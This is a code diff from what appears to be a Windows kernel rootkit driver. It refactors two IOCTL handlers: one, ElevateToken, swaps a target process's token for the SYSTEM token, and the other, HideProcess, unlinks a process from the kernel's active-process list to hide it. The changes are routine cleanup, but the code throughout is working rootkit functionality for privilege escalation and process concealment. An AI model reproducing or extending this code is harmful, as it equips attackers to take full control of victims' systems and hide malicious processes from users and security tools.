@@ -1,6 +1,6 @@
 #include "IoctlHandlers.h"
-#include "TokenHandler.h"
 #include "ProcessHandler.h"
+#include "TokenHandler.h"
 
 NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
 	PEPROCESS Process;
@@ -8,8 +8,8 @@ NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
 	auto status = STATUS_SUCCESS;
 	auto stack = IoGetCurrentIrpStackLocation(Irp);
 
-	auto pid = (ULONG*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
-	if (pid == nullptr || *pid < 0) {
+	auto pid = (PULONG)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+	if (pid == nullptr) {
 		Irp->IoStatus.Information = 0;
 		return STATUS_INVALID_PARAMETER;
 	}
@@ -20,7 +20,7 @@ NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
 		return status;
 	}
 	Token = PsReferencePrimaryToken(Process); // Get the process primary token.
-	ReplaceToken(Process, Token); // Replace the process token with system token.
+	TokenHandler::ReplaceToken(Process, Token); // Replace the process token with system token.
 
 	ObDereferenceObject(Token);
 	ObDereferenceObject(Process);
@@ -34,12 +34,12 @@ NTSTATUS IoctlHandlers::HideProcess(PIRP Irp) {
 	auto status = STATUS_SUCCESS;
 	auto stack = IoGetCurrentIrpStackLocation(Irp);
 
-	auto pid = (ULONG*)stack->Parameters.DeviceIoControl.Type3InputBuffer;
-	if (pid == nullptr || *pid < 0) {
+	auto pid = (PULONG)stack->Parameters.DeviceIoControl.Type3InputBuffer;
+	if (pid == nullptr) {
 		Irp->IoStatus.Information = 0;
 		return STATUS_INVALID_PARAMETER;
 	}
-	status = UnlinkActiveProcessLinks(*pid);
+	status = ProcessHandler::UnlinkActiveProcessLinks(*pid);
 	Irp->IoStatus.Information = 0;
 	Irp->IoStatus.Status = status;
 	return status;
